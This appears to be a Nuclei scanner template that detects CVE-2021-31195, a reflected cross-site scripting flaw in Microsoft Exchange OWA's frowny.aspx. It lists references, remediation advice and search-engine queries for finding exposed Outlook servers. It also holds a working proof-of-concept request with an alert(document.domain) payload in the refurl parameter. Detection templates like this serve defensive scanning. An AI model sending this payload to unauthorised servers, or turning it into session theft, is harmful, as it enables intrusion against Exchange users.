id: CVE-2021-31195

info:
  name: Microsoft Exchange Server - Cross-Site Scripting
  author: infosecsanyam
  severity: medium
  description: Microsoft Exchange Server, or OWA, is vulnerable to a cross-site scripting vulnerability in refurl parameter of frowny.asp.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the user's browser, potentially leading to session hijacking, data theft, or other malicious activities.
  remediation: |
    Apply the latest security updates provided by Microsoft to mitigate this vulnerability.
  reference:
    - https://blog.orange.tw/2021/08/proxyoracle-a-new-attack-surface-on-ms-exchange-part-2.html
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195
    - https://nvd.nist.gov/vuln/detail/CVE-2021-31195
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-31195
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cve-id: CVE-2021-31195
    cwe-id: CWE-79
    epss-score: 0.7541
    epss-percentile: 0.98681
    cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: microsoft
    product: exchange_server
    shodan-query:
      - http.title:"Outlook"
      - http.favicon.hash:1768726119
      - http.title:"outlook"
      - cpe:"cpe:2.3:a:microsoft:exchange_server"
    fofa-query:
      - title="outlook"
      - icon_hash=1768726119
    google-query: intitle:"outlook"
  tags: cve2021,cve,microsoft,exchange,owa,xss

http:
  - method: GET
    path:
      - '{{BaseURL}}/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'alert(document.domain)//&et=ServerError'
          - 'mail/bootr.ashx'
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 500
# digest: 4a0a0047304502203ddc35f87b59f971db2a1e7c9de9e8c56baa7552b7db7852eff35dbd9c6b5eb7022100cbec836f33b97c6ea3c840b8de26c2659eefeb95891f906a33c4e3612a4ae2fc:922c64590222798bb761d5b6d8e72950